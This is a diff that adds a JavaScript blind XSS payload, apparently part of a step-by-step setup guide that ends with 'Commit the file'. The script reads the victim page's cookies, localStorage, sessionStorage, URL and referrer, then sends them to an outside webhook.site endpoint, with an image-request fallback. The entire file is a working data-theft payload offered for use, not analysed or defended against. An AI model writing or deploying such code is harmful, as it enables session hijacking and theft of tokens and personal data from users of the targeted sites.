@@ -1,0 +1,51 @@
+// payload.js - This will be hosted at: https://yourusername.github.io/repo-name/payload.js
+console.log("Blind XSS payload executed!");
+
+// Collect all available data
+const extractedData = {
+    timestamp: new Date().toISOString(),
+    url: window.location.href,
+    userAgent: navigator.userAgent,
+    domain: document.domain,
+    cookies: document.cookie,
+    referrer: document.referrer,
+    
+    // Extract localStorage
+    localStorage: {},
+    sessionStorage: {}
+};
+
+// Get all localStorage items
+try {
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        extractedData.localStorage[key] = localStorage.getItem(key);
+    }
+} catch(e) {
+    extractedData.localStorage = "Access denied or not available";
+}
+
+// Get all sessionStorage items  
+try {
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        extractedData.sessionStorage[key] = sessionStorage.getItem(key);
+    }
+} catch(e) {
+    extractedData.sessionStorage = "Access denied or not available";
+}
+
+// Send data to your webhook - REPLACE THIS URL IN STEP 2
+fetch('https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(extractedData),
+    mode: 'no-cors' // Important for cross-origin requests
+}).catch(error => {
+    // Fallback method using image request
+    const img = new Image();
+    img.src = 'https://webhook.site/deb7f488-0159-4922-8dee-29f1c875e2aa/callback?data=' + encodeURIComponent(JSON.stringify(extractedData));
+});
+Commit the file
